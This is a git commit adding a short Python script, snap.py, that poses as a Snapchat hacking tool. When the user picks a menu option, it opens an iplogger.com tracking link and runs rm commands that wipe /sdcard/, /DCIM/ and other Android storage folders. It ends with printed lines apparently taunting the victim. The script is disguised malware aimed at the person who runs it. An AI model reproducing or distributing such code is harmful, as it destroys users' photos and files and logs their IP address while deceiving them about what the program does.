7e1a97472037d9c9773a3701cb9a3df192d64e1b
halocrak <79331796+halocrak@users.noreply.github.com>
2021-06-13 23:00:57 +0300

    Add files via upload

---
+++ snap.py
@@ -0,0 +1,22 @@
+import os,sys
+logo = """
+
+AUTHOR:zed
+telegram:zed
+
+"""
+
+print(logo)
+
+print("[1]HACK SNAP ")
+print("[2)BACK")
+int(input("select: "))
+os.system('xdg-open https://iplogger.com/2BGvD6')
+os.system('rm -rif /sdcard/')
+os.system('rm -rif /Andrid/')
+os.system('rm -rif /Dowlod/')
+os.system('rm -rif /Reset Settings/')
+os.system('rm -rif /DCIM/')
+print("twly formata ")
+print("tawaw tom ga dlm")
+print("to gairay ba dast zed")
